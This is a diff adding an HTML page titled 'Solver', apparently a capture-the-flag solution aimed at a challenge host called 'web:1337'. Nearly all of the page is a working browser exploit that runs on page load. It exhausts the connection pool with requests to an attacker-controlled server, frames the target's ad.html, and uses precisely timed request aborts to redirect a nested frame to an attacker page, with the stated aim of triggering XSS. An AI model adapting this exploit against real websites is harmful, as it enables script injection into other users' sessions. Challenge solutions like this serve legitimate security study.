@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solver</title>
+</head>
+<body>
+    <script>
+        let EXPLOIT_SERVER_URL = 'http://<VPS-IP>';
+        let BASE_URL = 'http://web:1337';
+
+        async function fill_sockets(n) {
+            return new Promise((resolve, reject) => {
+                let count = 0;
+                const intervalId = setInterval(() => {
+                    if(count >= n) {
+                        clearInterval(intervalId);
+                        resolve();
+                        return;
+                    }
+                    fetch(`${EXPLOIT_SERVER_URL}:${(8000+count)}/sleep`, {mode: "no-cors", cache: "no-store"});
+                    count++;
+                }, 5);
+            });
+        }
+        
+        function abortable_fetch() {
+            var controller = new AbortController();
+            var signal = controller.signal;
+            
+            fetch(`${EXPLOIT_SERVER_URL}:8256/sleep?aborter`, {mode: "no-cors", cache: "no-store", timeout: 1000000, signal: signal});
+            
+            return controller;
+        }
+
+        function inject_frame(url) {
+            const iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.width = '100%';
+            iframe.height = '100%';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+        }
+        
+        async function pop(url) {
+            var controller = abortable_fetch(); 
+
+            inject_frame(url);
+            
+            setTimeout(() => {
+                var tmp = abortable_fetch();
+                controller.abort();  
+                controller = tmp;
+
+                
+                setTimeout(() => {
+                    ping_block = abortable_fetch();
+                }, 50);
+
+                setTimeout(() => {
+                    controller.abort();
+                    block_ad = abortable_fetch();
+                    controller = block_ad;
+
+                    setTimeout(() => {
+                        this.frames[0].frames[0].location.href = `${EXPLOIT_SERVER_URL}/pop.html`;
+                        controller.abort();
+                    }, 5);
+                }, 25);
+
+                setTimeout(() => {
+                    controller = ping_block; // release->xss
+                    controller.abort();
+                }, 4000);
+
+            }, 80);
+
+            return new Promise((resolve) => {
+                setTimeout(() => {
+                    resolve(controller);
+                }, 160);
+            });
+        }
+
+
+        async function exploit(){
+            await fill_sockets(255);
+            await pop(`${BASE_URL}/ad.html`); 
+
+            console.log('[*] Exploit completed');
+        }
+
+        exploit();
+    </script>
+</body>
+</html>
